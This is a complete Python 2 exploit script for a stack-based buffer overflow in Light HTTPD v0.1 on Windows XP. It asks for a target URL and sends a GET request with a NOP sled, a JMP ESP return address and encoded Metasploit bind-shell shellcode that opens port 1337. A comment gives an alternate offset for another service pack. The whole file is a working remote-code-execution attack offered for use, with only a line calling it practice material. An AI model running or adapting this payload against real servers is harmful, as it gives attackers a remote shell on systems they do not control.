import urllib2
from time import sleep
 
#########################################################################################################################################
# Title************************Windows Light HTTPD v0.1 HTTP GET Buffer Overflow
# Discovered and Reported******24th of April, 2013
# Discovered/Exploited By******Jacob Holcomb/Gimppy042
# Software Vendor**************http://sourceforge.net/projects/lhttpd/?source=navbar
# Exploit/Advisory*************http://infosec42.blogspot.com/
# Software*********************Light HTTPD v0.1
# Tested Platform**************Windows XP Professional SP2
# Date*************************24/04/2013
#
#PS - This is a good piece of software to practice Stack Based Buffer Overflows if you curiouz and want to learnz
#########################################################################################################################################
# Exploit-DB Note: Offset 255 for Windows XP SP3
# jmp esp ntdll 0x7c31fcd8
# payload = "\x90" * 255 + "\xd8\xfc\x91\x7c" + "\x90" * 32 + shellcode
 
def targURL():
 
    while True:
     
        URL = raw_input("\n[*] Please enter the URL of the Light HTTP server you would like to PWN. Ex. http://192.168.1.1\n\n>")
        if len(URL) != 0 and URL[0:7] == "http://":
            break
             
        else:
            print "\n\n[!!!] Target URL cant be null and must contain http:// or https:// [!!!]\n"
            sleep(1)
             
    return str(URL)
     
     
def main():
 
    target = targURL()
    # msfpayload windows/shell_bind_tcp EXITFUNC=thread LPORT=1337 R | msfencode -c 1 -e x86/shikata_ga_nai -b "\x00\x0a\x0d\xff\x20" R
    shellcode = "\xb8\x3b\xaf\xc1\x8a\xdb\xcd\xd9\x74\x24\xf4\x5a\x29\xc9"
    shellcode += "\xb1\x56\x83\xc2\x04\x31\x42\x0f\x03\x42\x34\x4d\x34\x76"
    shellcode += "\xa2\x18\xb7\x87\x32\x7b\x31\x62\x03\xa9\x25\xe6\x31\x7d"
    shellcode += "\x2d\xaa\xb9\xf6\x63\x5f\x4a\x7a\xac\x50\xfb\x31\x8a\x5f"
    shellcode += "\xfc\xf7\x12\x33\x3e\x99\xee\x4e\x12\x79\xce\x80\x67\x78"
    shellcode += "\x17\xfc\x87\x28\xc0\x8a\x35\xdd\x65\xce\x85\xdc\xa9\x44"
    shellcode += "\xb5\xa6\xcc\x9b\x41\x1d\xce\xcb\xf9\x2a\x98\xf3\x72\x74"
    shellcode += "\x39\x05\x57\x66\x05\x4c\xdc\x5d\xfd\x4f\x34\xac\xfe\x61"
    shellcode += "\x78\x63\xc1\x4d\x75\x7d\x05\x69\x65\x08\x7d\x89\x18\x0b"
    shellcode += "\x46\xf3\xc6\x9e\x5b\x53\x8d\x39\xb8\x65\x42\xdf\x4b\x69"
    shellcode += "\x2f\xab\x14\x6e\xae\x78\x2f\x8a\x3b\x7f\xe0\x1a\x7f\xa4"
    shellcode += "\x24\x46\x24\xc5\x7d\x22\x8b\xfa\x9e\x8a\x74\x5f\xd4\x39"
    shellcode += "\x61\xd9\xb7\x55\x46\xd4\x47\xa6\xc0\x6f\x3b\x94\x4f\xc4"
    shellcode += "\xd3\x94\x18\xc2\x24\xda\x33\xb2\xbb\x25\xbb\xc3\x92\xe1"
    shellcode += "\xef\x93\x8c\xc0\x8f\x7f\x4d\xec\x5a\x2f\x1d\x42\x34\x90"
    shellcode += "\xcd\x22\xe4\x78\x04\xad\xdb\x99\x27\x67\x6a\x9e\xe9\x53"
    shellcode += "\x3f\x49\x08\x64\xba\xb0\x85\x82\xae\xd2\xc3\x1d\x46\x11"
    shellcode += "\x30\x96\xf1\x6a\x12\x8a\xaa\xfc\x2a\xc4\x6c\x02\xab\xc2"
    shellcode += "\xdf\xaf\x03\x85\xab\xa3\x97\xb4\xac\xe9\xbf\xbf\x95\x7a"
    shellcode += "\x35\xae\x54\x1a\x4a\xfb\x0e\xbf\xd9\x60\xce\xb6\xc1\x3e"
    shellcode += "\x99\x9f\x34\x37\x4f\x32\x6e\xe1\x6d\xcf\xf6\xca\x35\x14"
    shellcode += "\xcb\xd5\xb4\xd9\x77\xf2\xa6\x27\x77\xbe\x92\xf7\x2e\x68"
    shellcode += "\x4c\xbe\x98\xda\x26\x68\x76\xb5\xae\xed\xb4\x06\xa8\xf1"
    shellcode += "\x90\xf0\x54\x43\x4d\x45\x6b\x6c\x19\x41\x14\x90\xb9\xae"
    shellcode += "\xcf\x10\xd9\x4c\xc5\x6c\x72\xc9\x8c\xcc\x1f\xea\x7b\x12"
    shellcode += "\x26\x69\x89\xeb\xdd\x71\xf8\xee\x9a\x35\x11\x83\xb3\xd3"
    shellcode += "\x15\x30\xb3\xf1"
     
    #7C941EED   FFE4             JMP ESP ntdll.dll
    payload = "\x90" * 258 + "\xED\x1E\x94\x7C" + "\x90" * 32 + shellcode
    port = ":3000/"
    sploit = target + port + payload
     
    try:
        print "\n[*] Preparing to send Evil PAYLoAd to %s!\n[*] Payload Length: %d\n[*] Waiting..." % (target[7:], len(sploit))
        httpRequest = urllib2.Request(sploit)
        sploit = urllib2.urlopen(httpRequest, None, 6)
    except(urllib2.URLError):
        print "\n[!!!] Error. Please check that the Light HTTP Server is online [!!!]\n"
    except:
        print "\n[!!!] The server did not respond, but the payload was sent. F!ng3r$ Cr0$$3d 4 c0d3 Ex3cut!0n! [!!!]\n"
         
     
     
if __name__ == "__main__":
    main()  